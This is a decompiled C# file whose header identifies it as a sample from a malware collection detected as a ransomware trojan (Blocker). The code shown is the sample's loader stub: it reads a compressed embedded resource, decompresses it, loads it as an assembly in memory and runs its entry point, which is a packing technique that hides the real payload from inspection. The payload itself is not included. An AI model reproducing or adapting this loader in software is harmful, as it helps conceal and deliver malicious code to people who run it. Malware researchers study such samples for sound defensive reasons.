// Decompiled with JetBrains decompiler
// Type: Prog.Program
// Assembly: luckyparker, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A9114BB4-0741-4EC9-BE95-17D4457BFA5F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-a6c85e7de030a3dab8c99b5798f10ce8d9bfdf46.exe

using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;

namespace Prog
{
  internal class Program
  {
    private static void Main()
    {
      Assembly assembly = Assembly.Load(Program.Decompress((byte[]) new ResourceManager("cKNwq8", Assembly.GetExecutingAssembly()).GetObject("cKNwq8")));
      if ((object) assembly.EntryPoint == null)
        return;
      MethodInfo entryPoint = assembly.EntryPoint;
      object instance = assembly.CreateInstance(entryPoint.Name);
      entryPoint.Invoke(instance, (object[]) null);
    }

    private static byte[] Decompress(byte[] gzip)
    {
      using (GZipStream gzipStream = new GZipStream((Stream) new MemoryStream(gzip), CompressionMode.Decompress))
      {
        byte[] buffer = new byte[4096];
        using (MemoryStream memoryStream = new MemoryStream())
        {
          int count;
          do
          {
            count = gzipStream.Read(buffer, 0, 4096);
            if (count > 0)
              memoryStream.Write(buffer, 0, count);
          }
          while (count > 0);
          return memoryStream.ToArray();
        }
      }
    }
  }
}
